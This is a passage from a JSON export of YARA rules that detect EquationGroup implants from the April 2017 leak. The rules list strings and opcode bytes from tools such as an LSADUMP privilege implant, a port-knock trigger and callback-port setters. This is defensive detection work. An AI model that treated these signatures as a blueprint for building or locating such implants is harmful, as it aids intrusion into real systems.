\"1.7\"\n      \n   strings:\n      $s1 = \"system32\\\\winsrv.dll\" fullword wide\n      $s2 = \"raw_open CreateFile error\" fullword ascii\n      $s3 = \"\\\\dllcache\\\\\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )\n}","date":"2017-04-15 20:21:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_GrDo_FileScanner_Implant_RID3B3F","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"b77ca3111c19898e498e8381f7e6b983","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_msgks_mskgu_RID36A1 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:04:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 } \n      $op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 } \n      $op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-04-15 17:04:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_msgks_mskgu_RID36A1","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"7bc5b0809dcce5a3f137ee77fae3a444","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Ifconfig_Target_RID37E1 : APT DEMO EXE FILE T1050 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:57:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1050\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters\\\\Interfaces\\\\%hs\" fullword wide\n      $op1 = { 0f be 37 85 f6 0f 85 4e ff ff ff 45 85 ed 74 21 } \n      $op2 = { 4c 8d 44 24 34 48 8d 57 08 41 8d 49 07 e8 a6 4b } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}","date":"2017-04-15 17:57:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Ifconfig_Target_RID37E1","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"7e945b244da98a32790028bdad19134a","score":75,"tags":["APT","DEMO","EXE","T1050","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_DiBa_Target_RID360C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:39:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 41 5a 41 59 41 58 5f 5e 5d 5a 59 5b 58 48 83 c4 } \n      $op2 = { f9 48 03 fa 48 33 c0 8a 01 49 03 c1 49 f7 e0 88 } \n      $op3 = { 01 41 f6 e0 49 03 c1 88 01 48 33 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}","date":"2017-04-15 16:39:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_DiBa_Target_RID360C","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"388811d116e3bc51358ec962ccc06fbd","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Dsz_Implant_RID365B : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:52:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%02u:%02u:%02u.%03u-%4u: \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}","date":"2017-04-15 16:52:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Dsz_Implant_RID365B","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"33fe8c54b266ef283a636c231048ae65","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_GenKey_RID3439 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 15:21:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"* PrivateEncrypt -> PublicDecrypt FAILED\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )\n}","date":"2017-04-15 15:21:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_GenKey_RID3439","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"6ec81a655a6e62bd302756f166ffbdad","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_wmi_Implant_RID3677 : APT DEMO EXE FILE T1047 T1057 T1084 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:57:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1047, T1057, T1084\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"SELECT ProcessId,Description,ExecutablePath FROM Win32_Process\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them )\n}","date":"2017-04-15 16:57:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_wmi_Implant_RID3677","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"a400e12ff31c97f6be02a289e79a3735","score":75,"tags":["T1084","T1057","T1047","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_clocksvc_RID354E : APT DEMO EXE FILE T1050 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:07:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1050\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"~debl00l.tmp\" fullword ascii\n      $x2 = \"\\\\\\\\.\\\\mailslot\\\\c54321\" fullword ascii\n      $x3 = \"\\\\\\\\.\\\\mailslot\\\\c12345\" fullword ascii\n      $x4 = \"nowMutex\" fullword ascii\n      $s1 = \"System\\\\CurrentControlSet\\\\Services\\\\MSExchangeIS\\\\ParametersPrivate\" fullword ascii\n      $s2 = \"000000005017C31B7C7BCF97EC86019F5026BE85FD1FB192F6F4237B78DB12E7DFFB07748BFF6432B3870681D54BEF44077487044681FB94D17ED04217145B98\" ascii\n      $s3 = \"00000000E2C9ADBD8F470C7320D28000353813757F58860E90207F8874D2EB49851D3D3115A210DA6475CCFC111DCC05E4910E50071975F61972DCE345E89D88\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or 2 of ( $s* ) ) )\n}","date":"2017-04-15 16:07:31","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_clocksvc_RID354E","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"fc0a309581335db0d4793bef652a4ad3","score":75,"tags":["APT","DEMO","EXE","T1050","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_xxxRIDEAREA_RID359B : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:20:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"USAGE: %s -i InputFile -o OutputFile [-f FunctionOrdinal] [-a FunctionArgument] [-t ThreadOption]\" fullword ascii\n      $x2 = \"The output payload \\\"%s\\\" has a size of %d-bytes.\" fullword ascii\n      $x3 = \"ERROR: fwrite(%s) failed on ucPayload\" fullword ascii\n      $x4 = \"Load and execute implant within the existing thread\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}","date":"2017-04-15 16:20:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_xxxRIDEAREA_RID359B","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"6472cc3a38af094eeaf66811e6757cb3","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_yak_min_install_RID3834 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:11:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"driver start\" fullword ascii\n      $s2 = \"DeviceIoControl Error: %d\" fullword ascii\n      $s3 = \"Phlook\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-04-15 18:11:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_yak_min_install_RID3834","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"2f6453ea63d03b4b0a63708b17fad7ed","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_SetOurAddr_RID35D3 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:29:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"USAGE: SetOurAddr <input file> <output file> <protocol> [IP/IPX address]\" fullword ascii\n      $s2 = \"Replaced default IP address (127.0.0.1) with Local IP Address %d.%d.%d.%d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}","date":"2017-04-15 16:29:41","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_SetOurAddr_RID35D3","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"1ec865afd0e5a21004a41a29484ca53a","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_GetAdmin_LSADUMP_ModifyPrivilege_Implant_RID4116 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 00:30:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\system32\\\\win32k.sys\" fullword wide\n      $s2 = \"hKeAddSystemServiceTable\" fullword ascii\n      $s3 = \"hPsDereferencePrimaryToken\" fullword ascii\n      $s4 = \"CcnFormSyncExFBC\" fullword wide\n      $s5 = \"hPsDereferencePrimaryToken\" fullword ascii\n      $op1 = { 0c 2b ca 8a 04 11 3a 02 75 01 47 42 4e 75 f4 8b } \n      $op2 = { 14 83 c1 05 80 39 85 75 0c 80 79 01 c0 75 06 80 } \n      $op3 = { eb 3d 83 c0 06 33 f6 80 38 ff 75 2c 80 78 01 15 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and ( 4 of ( $s* ) or all of ( $op* ) ) )\n}","date":"2017-04-15 00:30:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_GetAdmin_LSADUMP_ModifyPrivilege_Implant_RID4116","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"9bd47bd45ed7033c0a9aebf804b409a0","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_SendPKTrigger_RID36EF : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:17:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"----====**** PORT KNOCK TRIGGER BEGIN ****====----\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-04-15 17:17:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_SendPKTrigger_RID36EF","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"68fdaccc15bcec1f88d619d44a2a623b","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_DmGz_Target_2_RID36BF : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:09:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\\\\\.\\\\%ls\" fullword ascii\n      $op0 = { e8 ce 34 00 00 b8 02 00 00 f0 e9 26 02 00 00 48 } \n      $op1 = { 8b 4d 28 e8 02 05 00 00 89 45 34 eb 07 c7 45 34 } \n      $op2 = { e8 c2 34 00 00 90 48 8d 8c 24 00 01 00 00 e8 a4 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}","date":"2017-04-15 17:09:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_DmGz_Target_2_RID36BF","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"7c47a5e261a640d8aa9a4eb574342716","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_mstcp32_DXGHLP16_tdip_RID391F : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:50:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n      $s2 = \"\\\\DosDevices\\\\%ws\" fullword wide\n      $s3 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n      $s4 = \"sys\\\\mstcp32.dbg\" fullword ascii\n      $s5 = \"%ws%03d%ws%wZ\" fullword wide\n      $s6 = \"TCP/IP driver\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 4 of them )\n}","date":"2017-04-15 18:50:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_mstcp32_DXGHLP16_tdip_RID391F","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"fbdb5b7e19e22b2d37125dbe73126301","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_regprobe_RID354C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:07:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Usage: %s targetIP protocolSequence portNo [redirectorIP] [CLSID]\" fullword ascii\n      $x2 = \"key does not exist or pinging w2k system\" fullword ascii\n      $x3 = \"RpcProxy=255.255.255.255:65536\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}","date":"2017-04-15 16:07:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_regprobe_RID354C","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"2c8aa954e58c7099e90430698d21d430","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_DoubleFeatureDll_dll_2_RID3A65 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:44:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".dllfD\" fullword ascii\n      $s2 = \"Khsppxu\" fullword ascii\n      $s3 = \"D$8.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them )\n}","date":"2017-04-15 19:44:41","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_DoubleFeatureDll_dll_2_RID3A65","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"f472de25fbfbbf9a85d0801ff6568355","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_GangsterThief_Implant_RID3A55 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:42:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\\\\\.\\\\%s:\" fullword wide\n      $s4 = \"raw_open CreateFile error\" fullword ascii\n      $s5 = \"-PATHDELETED-\" fullword ascii\n      $s6 = \"(deleted)\" fullword wide\n      $s8 = \"NULLFILENAME\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them )\n}","date":"2017-04-15 19:42:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_GangsterThief_Implant_RID3A55","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"9b4b7de2904a4d6b60b79324aa2ca5c7","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_SetCallbackPorts_RID3847 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:14:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"USAGE: %s <input file> <output file> <port1> [port2] [port3] [port4] [port5] [port6]\" fullword ascii\n      $s2 = \"You may enter between 1 and 6 ports to change the defaults.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}","date":"2017-04-15 18:14:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_SetCallbackPorts_RID3847","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"575c52463c41796f536bc56801024429","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_DiBa_Target_BH_2000_RID3816 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:06:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"0M1U1Z1p1\" fullword ascii\n      $s14 = \"SPRQWV\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}","date":"2017-04-15 18:06:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_DiBa_Target_BH_2000_RID3816","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"0f945d32c236e1a9e5683c07f7c0c1b5","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_rc5_RID3300 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 14:29:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage: %s [d|e] session_key ciphertext\" fullword ascii\n      $s2 = \"where session_key and ciphertext are strings of hex\" fullword ascii\n      $s3 = \"d = decrypt mode, e = encrypt mode\" fullword ascii\n      $s4 = \"Bad mode, should be 'd' or 'e'\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )\n}","date":"2017-04-15 14:29:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_rc5_RID3300","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"41d121343b7d73773dea874878e3c34c","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_PC_Level_Generic_RID37FC : APT DEMO EXE FILE GEN {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:01:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"wshtcpip.WSHGetSocketInformation\" fullword ascii\n      $s2 = \"\\\\\\\\.\\\\%hs\" fullword ascii\n      $s3 = \".?AVResultIp@Mini_Mcl_Cmd_NetConnections@@\" fullword ascii\n      $s4 = \"Corporation. All rights reserved.\" fullword wide\n      $s5 = { 49 83 3c 24 00 75 02 eb 5d 49 8b 34 24 0f b7 46 } \n      $op1 = { 44 24 57 6f c6 44 24 58 6e c6 44 24 59 } \n      $op2 = { c6 44 24 56 64 88 5c 24 57 } \n      $op3 = { 44 24 6d 4c c6 44 24 6e 6f c6 44 24 6f } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 2 of ( $s* ) or all of ( $op* ) )\n}","date":"2017-04-15 18:01:51","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_PC_Level_Generic_RID37FC","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"89d8ff71af2b2d375f68dbcbaa378fef","score":75,"tags":["APT","DEMO","EXE","GEN","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_PC_Level3_http_exe_RID38D3 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:37:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Copyright (C) Microsoft\" fullword wide\n      $op1 = { 24 39 65 c6 44 24 3a 6c c6 44 24 3b 65 c6 44 24 } \n      $op2 = { 44 24 4e 41 88 5c 24 4f ff } \n      $op3 = { 44 24 3f 6e c6 44 24 40 45 c6 44 24 41 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )\n}","date":"2017-04-15 18:37:41","description":"Detects EquationGroup Tool - April 